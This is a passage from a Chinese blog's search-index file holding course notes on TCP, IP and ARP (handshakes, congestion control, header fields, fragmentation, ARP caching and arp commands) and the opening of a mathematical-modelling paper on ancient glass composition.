Byte。</li></ul></blockquote><p>填充:为了使整个首部长度是4字节的整数倍，全0填充。</p><h5 id="TCP的封装："><a href="#TCP的封装：" class="headerlink" title="TCP的封装："></a>TCP的封装：</h5><p>TCP报文封装在lP数据报中，IP数据报的“协议类型”字段的值是6</p><img src=".\传输协议UDP与TCP\TCP的封装.png" style="zoom:67%;" /><h4 id="TCP链接的建立与释放："><a href="#TCP链接的建立与释放：" class="headerlink" title="TCP链接的建立与释放："></a>TCP链接的建立与释放：</h4><blockquote><p style="color:blue;">连接的三个阶段:连接建立、数据传送和连接释放。连接建立</p></blockquote><p>服务器首先准备接收TCP连接，这个过程叫做被动打开。这时的服务器的TCP已经准备好接受任何一台主机的TCP连接了。客户程序发出TCP请求的过程叫做主动打开。然后服务器与客户端就开始三次握手过程。</p><h5 id="三次握手建立连接："><a href="#三次握手建立连接：" class="headerlink" title="三次握手建立连接："></a>三次握手建立连接：</h5><p>1．客户发送第一个报文，这是一个SYN报文，在这个报文中只有SYN标志置为1，这个报文的作用是使序号同步。</p><img src=".\传输协议UDP与TCP\第一次握手.png" style="zoom:50%;" /><p>2．服务器发送第二个报文，即SYN+ACK报文，其中SYN和ACK标志被置为1首先，它是一个用来和对方进行通信的SYN报文。服务器使用这个报文同步初始序号，以便从服务器向客户发送字节。服务器还使用ACK标志确认已从客户端收到了SYN报文，同时给出期望从客户端收到的下一个序号。另外，服务器还定义了客户端要使用的接收窗口的大小。</p><img src=".\传输协议UDP与TCP\第二次握手.png" style="zoom:50%;" /><p>3．客户发送第三个报文。这仅仅是一个ACK报文。它使用ACK标志和确认号字段来确认收到了第二个报文。<br>然后客户端就可以通知上层应用进程，连接已经建立。服务器收到客户机的确认后，也通知上层应用进程，连接已经建立。</p><img src=".\传输协议UDP与TCP\第三次握手.png" style="zoom:50%;" /><h5 id="半关闭的四次握手方式终止连接："><a href="#半关闭的四次握手方式终止连接：" class="headerlink" title="半关闭的四次握手方式终止连接："></a>半关闭的四次握手方式终止连接：</h5><blockquote><p style="color:blue;">半关闭:TCP连接中，一方可以终止发送数据，但仍然保持接收数据，称为半关闭。半关闭通常是由客户端发起的。</p></blockquote><p><strong>半关闭的过程</strong></p><ol><li>客户发送FIN报文，半关闭了这个连接</li><li>服务器发送ACK报文接受了这个半关闭。但是，现在服务器仍然可以发送数据</li><li>当服务器已经把所有处理的数据都发送完毕时，就发送FIN报文</li><li>客户端发送ACK报文给予确认。<ul><li>在半关闭一条连接后，客户端仍然可以接收服务器发送的数据，而服务器也可以接收客户端发送的确认。但是，客户端不能传送数据给服务器。</li></ul></li></ol><img src=".\传输协议UDP与TCP\半关闭的四次握手方式终止连接.png" style="zoom:50%;" /><h4 id="流量控制："><a href="#流量控制：" class="headerlink" title="流量控制："></a>流量控制：</h4><p>发送端收到接收端的确认报文之前，对发送端发送的数据量进行管理</p><p>在不考虑流量控制的情况下，传输层协议可以每次只发送一个字节的数据，然后在发送下一个字节数据之前等待接收端的确认报文。这是一个非常缓慢的过程，发送端在等待确认报文时一直处于空闲状态。<br>还有一种情况是传输层协议一次就将全部数据发送出去，而不理会确认报文。这样虽然加速了发送过程，但可能会使接收端来不及接收而瘫痪。此外，若有一部分数据丢失、重复、失序或损坏，发送端就要一直等到接收端将全部数据都检查完毕后才能知道。</p><h4 id="滑动窗口"><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h4><p>TCP的流量控制在缓存上定义了一个窗口，称为滑动窗口，窗口大小的单位是字节，TCP发送数据的多少由滑动窗口决定。</p><p>TCP报文段首部的窗口字段就是给发送方设置的发送窗口的上限。</p><p>发送窗口在连接建立时由双方商定，在通信过程中动态调整。</p><p>如果发送方收到接收方的窗口大小U HIr以人tx’P送数据（带URG标志的数据段除外）。</p><img src=".\传输协议UDP与TCP\滑动窗口.png" style="zoom:67%;" /><p>发送端只要收到了对方的确认，发送窗口就可前移。<br>发送TCP维护一个指针。每发送一个报文段，指针向前移动一个报文段的距离。</p><blockquote><p style="color:red;">滑动窗口的右沿可以向左移动吗?</p>**滑动窗口的右沿向左移动通常发生在对方通知窗口缩小时**。使某些可以发送的数据变成不能发送，如果发送端已经发送了这些数据，就会产生错误。<p>TCP标准强烈不赞成这样做。</p></blockquote><blockquote><p style="color:red;">滑动窗口的左沿可以向左移动吗?</p>**窗口的左沿不能向左移动**，因为这表示已经发送出去的并且经过确认的数据现在又要回收了</blockquote><h4 id="拥塞控制："><a href="#拥塞控制：" class="headerlink" title="拥塞控制："></a>拥塞控制：</h4><h5 id="拥塞控制与流量控制的对比"><a href="#拥塞控制与流量控制的对比" class="headerlink" title="拥塞控制与流量控制的对比:"></a>拥塞控制与流量控制的对比:</h5><blockquote><p style="color:blue;">出现资源拥塞的条件:    对资源需求的总和>可用资源</p></blockquote><ul><li>防止过多的数据注入到网络中，可以使路由器或者链路不至于过载。</li><li>拥塞控制是一个<strong>全局性</strong>的过程，涉及到所有的主机、路由器，以及与降低网络传输性能有关的所有因素。</li></ul><p><strong>流量控制：</strong>在给定的发送端和接收端之间的<strong>点对点通信量的控制</strong>。</p><ul><li>流量控制所要做的就是抑制发送端发送数据的速率，以便使接收端来得及接收</li></ul><h5 id="拥塞控制的作用："><a href="#拥塞控制的作用：" class="headerlink" title="拥塞控制的作用："></a>拥塞控制的作用：</h5><img src=".\传输协议UDP与TCP\拥塞控制.png" style="zoom:50%;" /><h5 id="拥塞控制方法"><a href="#拥塞控制方法" class="headerlink" title="拥塞控制方法"></a>拥塞控制方法</h5><blockquote><p style="color:black;">慢开始:        初始设置拥塞窗口cwnd = 1，每收到一个对新的报文段的确认后，将拥塞窗口加1，逐步增大发送端的拥塞窗口cwnd。</p></blockquote><blockquote><p style="color:black;">拥塞避免:    使拥塞窗口cwnd按线性规律缓慢增长，“加法增大”。</p></blockquote><img src=".\传输协议UDP与TCP\慢开始于拥塞避免.png" style="zoom:50%;" /><blockquote><p style="color:black;">快重传:接收方每收到一个失序的报文段后就立即发出重复确认，这样做可以让发送方及早知道有报文段没有到达接收方。发送方只要一连收到三个重复确认就应当立即重传对方尚未收到的报文段。</p></blockquote><img src=".\传输协议UDP与TCP\快重传.png" style="zoom:50%;" /><blockquote><p style="color:black;">快恢复:当发送端收到连续三个重复的确认时，就执行“乘法减小”算法，把慢开始门限ssthresh 减半，但接下去不执行慢开始算法，而是执行拥塞避免算法“加法增大”，使拥塞窗口缓慢地线性增大，实现快恢复。</p></blockquote><img src=".\传输协议UDP与TCP\快恢复.png" style="zoom:50%;" /><h5 id="发送窗口大小"><a href="#发送窗口大小" class="headerlink" title="发送窗口大小:"></a>发送窗口大小:</h5><p>考虑拥塞控制的情况下，窗口大小由接收窗口和拥塞窗口两者中的较小者决定。接收窗口大小由接收方发送的确认报文中的窗口大小字段值所确定。这是接收端在缓存溢出导致数据被丢弃之前所能接受的最大字节数。拥塞窗口大小是由网络根据拥塞情况而确定的。<br>发送窗口的上限值= Min [rwnd, cwnd]</p><blockquote><ul><li><p>当rwnd &lt; cwnd时，是接收方的接收能力限制发送窗口的最大值</p></li><li><p>当cwnd &lt; rwnd时，则是网络的拥塞限制发送窗口的最大值。</p></li></ul></blockquote><h4 id="差错控制："><a href="#差错控制：" class="headerlink" title="差错控制："></a>差错控制：</h4><h5 id="TCP的差错控制"><a href="#TCP的差错控制" class="headerlink" title="TCP的差错控制"></a>TCP的差错控制</h5><ul><li>应用程序把数据流交付给TCP后，就依靠TCP把整个数据流交付给接收端的应用程序，并且保证数据流是按序的、没有差错的、也没有任何一部分是丢失的或重复的。</li><li>TCP使用差错控制提供可靠性。差错控制包括以下的一些机制:检测受到损伤的报文、丢失的报文、失序的报文和重复的报文。</li></ul><blockquote><p style="color:blue;">实现方式：通过校验和、确认以及超时重传三种机制实现</p></blockquote><ul><li><p>校验和:用来检验报文是否出错，如果出错，接收端就将报文丢弃</p></li><li><p>确认</p><ul><li>累积确认：不必对收到的分组逐个发送确认，而是对按序到达的最后一个分组发送确认</li><li>选择确认：首部选项SACK用于报告收到的不连续的字节块的边界</li><li>确认报文不携带数据，但消耗一个序号。除了ACK报文之外，确认报文也需要被确认。</li></ul></li><li><p>重传</p><ul><li>超时计时器到时:发送端为每一个TCP报文段都设置一个超时计时器，若计时器到时仍没收到确认，就重传这个报文。超时计时器的值是动态的，根据报文的往返时间而更新</li><li>快重传:发送端只要一连收到三个重复的ACK即可断定有报文段丢失了，就应立即重传而不必等待计时器超时。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网际协议IP</title>
      <link href="/2022/11/12/%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/"/>
      <url>/2022/11/12/%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/</url>
      
        <content type="html"><![CDATA[<h2 id="网际协议IP"><a href="#网际协议IP" class="headerlink" title="网际协议IP"></a>网际协议IP</h2><p>[TOC]</p><h3 id="IP协议简介（lP-Internet-Protocol）"><a href="#IP协议简介（lP-Internet-Protocol）" class="headerlink" title="IP协议简介（lP- Internet Protocol）"></a>IP协议简介（lP- Internet Protocol）</h3><ul><li>网际协议IP是TCP/IP最核心的协议，也是最重要的因特网标准协议之一</li><li>IP负责将数据包从源点交付到终点，所有的TCP、UDP、ICMP及IGMP数据都以IP数据报格式传输。</li></ul><h4 id="IP的特性："><a href="#IP的特性：" class="headerlink" title="IP的特性："></a>IP的特性：</h4><blockquote><p style="color:blue;">不可靠:不保证分组成功地送到目的站。任何可靠性的要求必须由上层协议实现。</p></blockquote><blockquote><p style="color:orange;">无连接:IP并不维护任何后续分组的状态信息，每个分组都是相互独立的</p></blockquote><blockquote><p style="color:red;">尽最大努力交付:IP协议尽力发送每个分组，只有当资源用完或网络出现故障时才会发送失败</p></blockquote><h4 id="IP地址及表示方法："><a href="#IP地址及表示方法：" class="headerlink" title="IP地址及表示方法："></a>IP地址及表示方法：</h4><p>IP地址：一个IP地址惟一地标识了Internet上的一台主机，IPv4协议使用32位地址，这表示地址空间是2^32。而IPv6协议使用128位地址，地址空间为2^128。<br>表示方法：点分十进制表示:每个字节用一个十进制数表示。</p><img src="./网际协议IP/IP地址分类.png"/><h5 id="网络号："><a href="#网络号：" class="headerlink" title="网络号："></a>网络号：</h5><p>D类地址和E类地址不划分网络号和主机号。</p><img src="./网际协议IP/网络号.png" style="zoom:67%;" /><h5 id="特殊的IP地址："><a href="#特殊的IP地址：" class="headerlink" title="特殊的IP地址："></a>特殊的IP地址：</h5><blockquote><p style="color:blue;">网络地址:主机号全0的IP地址，不分配给任何主机，作为网络本身的标识</p></blockquote><blockquote><p style="color:orange;">广播地址:主机号为全1的IP地址，用作广播地址，目的地址为广播地址的数据包传递给该网络中的所有节点</p></blockquote><blockquote><p style="color:skyblue;">有限广播地址:32位为全“1”的IP地址(255.255.255.255)，通常由无盘工作站启动时使用，希望从网络IP地址服务器处获得一个IP地址</p></blockquote><blockquote><p style="color:red;">主机本身地址:32位全“0”的IP地址(0.0.0.0)称为主机本身地址</p>- 当一个主机要获得其IP地址时，可以运行一个引导程序，并发送一个以全0为源地址、以全1为目的地址的分组给引导服务器，以获得本主机的IP地址。</blockquote><blockquote><p style="color:black;">环回地址:27.0.0.1称为回环地址，可用来测试TCP/IP协议是否正常工作，常用于本机上软件测试和本机上网络应用程序之间的通信地址。</p>- 使用回送地址发送数据，协议软件立即返回，不进行任何网络传输。</blockquote><h5 id="专用IP地址："><a href="#专用IP地址：" class="headerlink" title="专用IP地址："></a>专用IP地址：</h5><p>专用lIP地址:仅用于专用网内部的本地主机。<br>大多数路由器不转发携带专用IP地址的数据包，本地主机必须经网络地址转换服务器才能访问Internet。<br>专用IP地址范围: </p><img src="./网际协议IP/专用IP地址.png" style="zoom:67%;" /><h4 id="子网划分："><a href="#子网划分：" class="headerlink" title="子网划分："></a>子网划分：</h4><p><strong>Subnetting</strong><br>提高IP空间的利用率，增加IP分配的灵活性。<br>从主机号借用若干个比特作为子网号subnet-id，而主机号host-id也就相应减少若干个比特</p><p><img src="./%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86%E7%A4%BA%E6%84%8F%E5%9B%BE.png"></p><h4 id="子网掩码："><a href="#子网掩码：" class="headerlink" title="子网掩码："></a>子网掩码：</h4><blockquote><p style="color:blue;">子网掩码是一个网络号全1，主机号全0的32位二进制数，用于确定P中有多少位用于子网号。</p>- **~~表示方法~~**：点分十进制，IP地址后用`/`后面写明网络号的位数- 子网掩码与IP地址**按位做与**得到IP地址对应的**网络地址**</blockquote><h3 id="IP数据格式："><a href="#IP数据格式：" class="headerlink" title="IP数据格式："></a>IP数据格式：</h3><p><img src="./%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/IP%E7%9A%84%E6%8A%A5%E6%96%87%E6%A0%BC%E5%BC%8F.png"></p><p>IP数据报由首部和数据两部分组成</p><h4 id="各字段的含义："><a href="#各字段的含义：" class="headerlink" title="各字段的含义："></a>各字段的含义：</h4><p>版本:4 bit，指IP协议的版本，目前的IP协议版本号为4(即IPv4)</p><p>首部长度:4 bit，以4字节为单位，因此IP的首部长度最大是60字节</p><p>服务类型: 8 bit，区分服务，一般不用。</p><p>总长度: 16 bit，首部和数据之和的长度，单位为字节，因此数据报的最大长度为65535字节。总长度不能超过网络的最大传输单元MTU。</p><p>标识:16 bit，数据报计数器</p><blockquote><p>IP软件在存储器中维持一个计数器，每产生一个数据报，计数器加1，并将此值赋给标识字段。<br>当数据报由于长度超过网络MTU而必须分片时，标识字段的值就被复制到所有的数据报分片的标识字段中。<br>相同的标识字段的值使分片后的各数据报片能正确重组成原来的数据报。</p></blockquote><p>标志: 3 bit，目前只有两位有意义</p><blockquote><ul><li>第一位保留。</li><li>中间一位记为DF，为不分片标志，只有当DF=0时才允许分片。</li><li>最后一位为MF，MF=1表示后面还有分片，MF=O表示这是最后一个数据报片。</li></ul></blockquote><p>偏移量:13 bit，较长的分组被分片后，某分片在原分组中的相对位置。片偏移以8个字节为单位。每个分片的长度必须是8的整数倍。</p><p>生存时间:8 bit，记为TTL (Time To Live)</p><blockquote><ul><li><p>表明数据报在网络中的寿命，其单位为秒。现在TTL的单位是跳数，指明数据报在因特网中至多可经过多少个路由器，最大值为255，通常为32、64、128。</p></li><li><p>当TTL值为1时，表示这个数据报只能在本局域网内传送，因为这个数据报传送到局域网上的某个路由器，在被转发之前TTL值就减小到0，因而会被路由器丢弃。</p></li></ul></blockquote><p>协议: 8 bit，指出此数据报携带的数据使用何种协议，以便目的主机的IP层将数据部分上交给对应的进程处理。</p><p><img src="./%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/IP%E7%9A%84%E9%AB%98%E5%B1%82%E5%8D%8F%E8%AE%AE.png"></p><p>首部检验和:16 bit，检验数据报的首部，不包括数据部分。采用简单的16位反码求和的计算方法。</p><p>源IP地址: 32bit，定义了源主机的IP地址。在IP数据包从源主机传送到目的主机期间，该字段保持不变。</p><p>目的IP地址: 32bit，定义了目的主机的IP地址。在IP数据报从源主机传送到目的主机期间，该字段保持不变。</p><h3 id="IP数据报分片："><a href="#IP数据报分片：" class="headerlink" title="IP数据报分片："></a>IP数据报分片：</h3><p>数据包可能经过多个不同的网络，每一个路由器把收到的帧进行拆装，处理后又封装成另一个帧。<br>收到帧的格式与长度取决于这个帧刚经过的物理网络所使用的协发<br>送出去的帧的格式与长度取决于这个帧将要经过的物理网络所使用的协议。</p><p><strong>最大传输单元MTU</strong>：不同网络所能传送的数据包的最大长度是不同的，这个最大长度叫做最大传输单元MTU ( Maximum Transmission Unit ) </p><blockquote><p style="color:orange;">MTU即该网络的数据链路层帧的数据部分的最大长度。</p></blockquote><h4 id="分片："><a href="#分片：" class="headerlink" title="分片："></a>分片：</h4><blockquote><ul><li><p>对于物理网络，如果数据包的长度超过了MTU，就要把数据部分进行分片。</p></li><li><p>每个分片都有自己的首部。</p></li><li><p>如果已经分片的数据包要经过更小MTU的网络，那么这些已经分片的数据包还可再进行分片，数据包在到达最后终点之前可以经过多次的分片。</p></li><li><p style="color:red;">数据包可以被源主机或在其路径上的路由器进行分片，但是数据包的重装只能在目的主机上进行。</p></li></ul></blockquote><h4 id="重组"><a href="#重组" class="headerlink" title="重组"></a>重组</h4><h5 id="目的主机进行分片重组"><a href="#目的主机进行分片重组" class="headerlink" title="目的主机进行分片重组"></a>目的主机进行分片重组</h5><blockquote><p style="color:blue;">IP规定，数据报分片的重组地点是目的主机，中间路由器不对任何被分片的数据报进行重组，即使其转发接口的MTU非常大。</p></blockquote><blockquote><p>优点:<br>简化了路由软件的操作，提高了路由器的处理效率。<br>可以避免重复分片。在数据报投递过程中，途经网络的MTU是不可预知的</p></blockquote><blockquote><p>缺点<br>浪费带宽。因为每个分片都要有一个首部，分片越多，首部开销越大。<br>增加了数据包丢失的可能性。分片越多，丢失的可能性越大。一旦丢失了一个分片，整个数据报就必须重新传输。</p></blockquote><h5 id="分片重组："><a href="#分片重组：" class="headerlink" title="分片重组："></a>分片重组：</h5><p>有关的三个字段是:标识字段、标志字段和偏移量字段。</p><p>当目的主机收到一个数据报时，可以根据偏移量和MF位判断:</p><ul><li>片偏移不为0，表明它是一个分片;</li><li>如果片偏移为0，且MF位为1，表明它是第一个分片;</li><li>如果片偏移为0，且MF位为0，则表明它是一个完整的数据报。</li></ul><p>根据数据报首部“标识”字段的值，可判断哪些分片属于同一个原始数据报片偏移用来确定分片在原始数据报中的位置。</p><h5 id="重组定时器："><a href="#重组定时器：" class="headerlink" title="重组定时器："></a>重组定时器：</h5><p>为防止因等待一个丢失的分片而无限期延长重组过程，在重组分片时启动一个定时器,如果超时后仍然没有收到一个数据报的全部分片，则该数据报被丢弃。<br>IP数据报校验和：</p><blockquote><p style="color:blue;">校验和：数据包上的附加信息，能够识别数据包在传输过程中是否出错。</p></blockquote><p>发送端先计算校验和，并把得到的结果与数据包一起发送出去。接收端对数据包进行同样的计算。若结果正确，则接受这个数据包，否则就丢弃它。</p><h4 id="校验和的计算："><a href="#校验和的计算：" class="headerlink" title="校验和的计算："></a>校验和的计算：</h4><p>发送端：将数据包按16位分段。把这些段用反码算术运算相加，将相加后得到的和再取反码就得出了校验和。<br>接收端：把收到的数据包按16位分段，并把这些段相加。得到的和取反码。若结果为0，则接受这个数据包，否则拒绝这个数据包。</p><img src="./网际协议IP/校验计算.png" style="zoom: 50%;" /><h4 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h4><blockquote><blockquote><p style="color:blue;">IP数据包的校验和只校验IP首部部分而不校验IP数据部分。</p></blockquote><ul><li>首先，所有将数据封装在IP数据报中的高层协议，都有覆盖整个数据包的校验和。因此，IP数据报的校验和就不必再检验所封装的数据部分。</li><li>其次，每经过一个路由器，IP数据包的首部就要改变一次，但数据部分不改变。因此若校验和包含数据部分，这就意味着路由器要花费很多时间计算没有改变的数据部分的校验和。</li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
            <tag> IP协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>地址解析协议 ARP</title>
      <link href="/2022/11/12/%E5%9C%B0%E5%9D%80%E8%A7%A3%E6%9E%90%E5%8D%8F%E8%AE%AEARP/"/>
      <url>/2022/11/12/%E5%9C%B0%E5%9D%80%E8%A7%A3%E6%9E%90%E5%8D%8F%E8%AE%AEARP/</url>
      
        <content type="html"><![CDATA[<h2 id="地址解析协议-ARP"><a href="#地址解析协议-ARP" class="headerlink" title="地址解析协议 ARP"></a>地址解析协议 ARP</h2><p>[TOC]</p><h3 id="ARP的定义与基本功能"><a href="#ARP的定义与基本功能" class="headerlink" title="ARP的定义与基本功能"></a>ARP的定义与基本功能</h3><ul><li><p>掌握ARP协议的报文格式</p></li><li><p>掌握ARP协议的工作原理</p></li><li><p>理解ARP高速缓存的作用</p></li><li><p>掌握ARP缓存表的维护过程</p></li></ul><p><strong>ARP</strong>(Address Resolution Protocol，RFC 826）是根据IP地址获取物理地址的一个TCP/IP协议。主机通过将ARP请求<strong>广播</strong>到网络上的所有主机并接收返回消息来确定目标IP地址的物理地址，同时将IP地址和硬件地址存入本机ARP缓存中，下次请求时直接查询<strong>ARP缓存</strong>。</p><h4 id="物理地址："><a href="#物理地址：" class="headerlink" title="物理地址："></a>物理地址：</h4><p>物理地址通常是由硬件来实现的，例如以太网的物理地址被写入到网卡中，任何一块网卡的物理地址是唯一的</p><blockquote><p style="color:blue;">物理地址的长度和格式取决于具体的网络，以太网的物理地址是6字节地址物理地址可以是单播地址、多播地址或广播地址。</p></blockquote><h4 id="逻辑地址："><a href="#逻辑地址：" class="headerlink" title="逻辑地址："></a>逻辑地址：</h4><p>逻辑地址与物理设备本身没有关联, 逻辑地址可以是单播地址、多播地址和广播地址。</p><blockquote><p style="color:skyblue;">目前Internet上的IPv4协议逻辑地址是32位的IP地址， IPv6地址有128位长</blockquote><h4 id="地址解析"><a href="#地址解析" class="headerlink" title="地址解析:"></a>地址解析:</h4><p>逻辑地址是在网络层使用的，但数据包是在物理网络传递。主机或路由器是通过物理地址来识别的,因此将一个数据包传递到一个主机或路由器要进行寻址，需要将一个逻辑地址映射到相应的物理地址。</p><blockquote><p style="color:blue;">地址解析就是主机在发送帧前将目的逻辑地址转换成目的物理地址的过程。</p></blockquote><h5 id="静态映射"><a href="#静态映射" class="headerlink" title="静态映射:"></a>静态映射:</h5><p>手工创建IP地址与物理地址的映射关系，建立映射表。当已知IP地址时，通过查找映射表得到对应的物理地址。</p><blockquote><p style="color:orange;">局限性: 主机更换了网卡，也就改变了主机的物理地址。当主机从一个网络移到另一个网络时，物理地址没变，但IP地址改变了。·要适应这些变化，会增大维护静态映射表的开销。</p></blockquote><h5 id="用协议实现地址映射："><a href="#用协议实现地址映射：" class="headerlink" title="用协议实现地址映射："></a>用协议实现地址映射：</h5><p>在使用TCP/IP协议的以太网中，<strong>ARP</strong>(Address Resolution Protocol)协议完成将IP地址映射到MAC地址的过程，逆地址解析协议<strong>RARP</strong>(Reverse Address Resolution Protocol)将物理地址映射为IP地址</p><h3 id="ARP的报文格式："><a href="#ARP的报文格式：" class="headerlink" title="ARP的报文格式："></a>ARP的报文格式：</h3><img src="D:\blog\shierjinghuang\source\_posts\地址解析协议ARP\ARP的报文格式.png"  /><p style="color:blue; text-indent: 112px;">硬件类型:16bit，定义运行ARP的网络类型，如以太网的硬件类型是1。</p><p style="color:blue; text-indent: 112px;">协议类型:16bit，定义使用ARP的高层协议，如对于IPv4协议，该字段的值是Ox0800。</p><p style="color:blue; text-indent: 112px;">硬件长度:8bit，以字节为单位的物理地址长度，如以太网硬件地址长度为6。</p><p style="color:blue; text-indent: 112px;">协议长度:8bit，以字节为单位的逻辑地址的长度，对于IPv4，该字段为4。<p><p style="color:blue; text-indent: 112px;">操作码:16bit,1表示ARP请求，2表示ARP应答。</p><p style="color:blue; text-indent: 112px;">发送端硬件地址:变长字段，对于以太网该字段长度是6字节</p><p style="color:blue; text-indent: 112px;">发送端逻辑地址:变长字段，对于IPv4地址，该字段长度为4字节。</p><p style="color:rgb(255, 118, 0); text-indent: 112px;">目的端硬件地址:变长字段，对于ARP请求报文，该字段全为0</p><p style="color:blue; text-indent: 112px;">目的端逻辑地址:变长字段，定义目标逻辑地址。</p><p style="color:black;">ARP数据报直接封装在数据链路层的帧中</p><img src="D:\blog\shierjinghuang\source\_posts\地址解析协议ARP\ARP封装.png" style="zoom:80%;" /><h3 id="ARP的运行过程："><a href="#ARP的运行过程：" class="headerlink" title="ARP的运行过程："></a>ARP的运行过程：</h3><h4 id="数据包传输步骤"><a href="#数据包传输步骤" class="headerlink" title="数据包传输步骤"></a>数据包传输步骤</h4><blockquote><ul><li>发送端知道目的端的IP地址。</li><li>IP要求ARP创建一个ARP请求报文，其中包含了发送方的物理地址、发送方的IP地址和目的端的IP地址。目的端的物理地址用0填充</li><li>将报文传递到数据链路层，并在该层中用<strong>发送方的物理地址作为源地址</strong>，<strong>用物理广播地址作为目的地址</strong>，将其封装在一个帧中。</li><li>因为该帧中包含了一个<strong>广播</strong>目的地址，所以同一链路中的每个主机或路由器都接收到这个帧。所有接收到该帧的主机都将其传递到ARP层进行处理。<strong>除了目的端主机以外的所有主机都丢弃该报文</strong>。</li><li>目的主机用一个包含其物理地址的ARP应答报文<strong>单播</strong>做响应。</li><li>发送方接收到这个应答报文，这样它就知道了目标主机的物理地址。</li><li>将IP数据报封装在一个帧中，并单播到目的地址。</li></ul></blockquote><h3 id="ARP高速缓存："><a href="#ARP高速缓存：" class="headerlink" title="ARP高速缓存："></a>ARP高速缓存：</h3><p>当主机A通过ARP请求得到B的物理地址后就将“IP地址—MAC地址”的绑定信息存储在<strong>高速缓存</strong>中。对于后续发往E的分组，可以通过缓存得到物理地址<br>当ARP被询问一个已知IP地址节点的MAC地址时，先在ARP缓存表查看，若存在，就直接返回MAC地址，若不存在，才发送ARP请求向局域网查询。</p><h4 id="缓存表内容："><a href="#缓存表内容：" class="headerlink" title="缓存表内容："></a>缓存表内容：</h4><p>静态项目一直保留在缓存中，直到重新启动计算机为止。</p><p>动态项目随时间推移自动添加和删除，每个动态ARP缓存项的潜在生命周期是10分钟。<br>新加到缓存中的项目带有时间戳，如果某个项目添加后2分钟内没有再使用，则此项目过期并从ARP缓存中删除;<br>如果某个项目已在使用，则又收到2分钟的生命周期;<br>如果某个项目始终在使用，则会另外收到2分钟的生命周期，一直到10分钟的最长生命周期。</p><h4 id="arp命令的用法"><a href="#arp命令的用法" class="headerlink" title="arp命令的用法:"></a>arp命令的用法:</h4><p>arp命令用于对本地arp缓存进行操作，不会发送ARP请求</p><blockquote><ul><li>arp -a:              列出ARP缓存中的所有条目</li><li>arp -a ip:          列出缓存中与ip对应的条目</li><li>arp -d:              清空arp缓存</li><li>arp -d ip:          删除缓存中与ip对应的条目</li><li>arp -s ip mac : 在arp缓存中添加一个静态arp条目</li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
            <tag> ARP协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>古代玻璃制品的成分分析与鉴别</title>
      <link href="/2022/11/01/%E5%9B%BD%E8%B5%9B%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/"/>
      <url>/2022/11/01/%E5%9B%BD%E8%B5%9B%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="古代玻璃制品的成分分析与鉴别"><a href="#古代玻璃制品的成分分析与鉴别" class="headerlink" title="古代玻璃制品的成分分析与鉴别"></a>古代玻璃制品的成分分析与鉴别</h2><p>[TOC]</p><h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>本文基于一批我国古代玻璃制品的相关数据进行了古代玻璃制品的成分分析与鉴别，建立了古代玻璃制品鉴别模型，对各问题进行了分析。</p><p>对于问题一，针对玻璃文物的表面风化与玻璃类型、纹饰和颜色是否具有关系的问题，计算玻璃类型、颜色、纹饰与表面风化的斯皮尔曼系数，分析相关性，得到结论“表面风化和玻璃类型关系最大，和玻璃颜色与纹饰的关系不大”。为预测其风化前的化学成分含量，通过分析文物表面风化前后化学成分含量变化的统计学规律，结合聚类分析及多项式曲线拟合，对风化前数据进行了预测，预测详情数据见支撑材料。</p><p>对于问题二，首先，为得出高钾玻璃和铅钡玻璃的分类规律，将无风化的高钾和铅钡玻璃各化学成分含量的均值曲线进行对比，采用统计学方法分析得出高钾玻璃、铅钡玻璃的分类规律。其次，为解决高钾玻璃和铅钡玻璃的亚类划分问题，运用SPSS工具，采用聚类分析法，依据各样本每种化学成分含量与其他样本各化学成分含量之间的联系进行聚类。聚类完成后再加以统计学分析，寻找其聚为一类的原因并从中提炼分类特征。最终聚类结果为：高钾玻璃分3类，分别为低铅钡玻璃、高磷玻璃、高铜玻璃；铅钡玻璃分5类，分别为高磷玻璃、高钠玻璃、高铝玻璃、钙铁玻璃、高铜玻璃。之后通过计算轮廓系数分析得到模型的合理性，并通过增添样本衡量分类结果的敏感性。</p><p>对于问题三，在对附件表单3中未知类别玻璃文物的化学成分进行分析时先将数据分为无风化和风化，之后经由表单2按照风化、无风化的标准通过箱图、散点图进行数据分析找出适合做自变量的化学成分，确定自变量和因变量从而建立多元回归模型。通过SPSS并依据建立的模型确定影响较高的化学成分进而推测其所属类型。可知高钾玻璃分别是A1、A4、A6、A7，铅钡玻璃分别是A2、A3、A5、A8。在敏感性分析上，更改各项系数中的一项，取附录2中数据代入计算，原计算结果与新数据的变化很明显，数据显著性很强。</p><p>对于问题四，针对不同类别的玻璃文物样品，使用灰色关联分析法分析其化学成分之间的关联关系，得出不同种类的玻璃所含化学成分的关联系数并对其进行排序。通过对不同玻璃类型的数据进行灰色关联分析，得到几组不同的关系系数列表，通过各个关系系数列表的对比，体现不同种类玻璃化学成分关联关系的差异性。</p><p>关键词：<strong>多元回归</strong> <strong>斯皮尔曼系数</strong> <strong>聚类分析</strong> <strong>灰色关联分析</strong> </p><h3 id="一、问题重述"><a href="#一、问题重述" class="headerlink" title="一、问题重述"></a>一、问题重述</h3><h4 id="1-1问题背景"><a href="#1-1问题背景" class="headerlink" 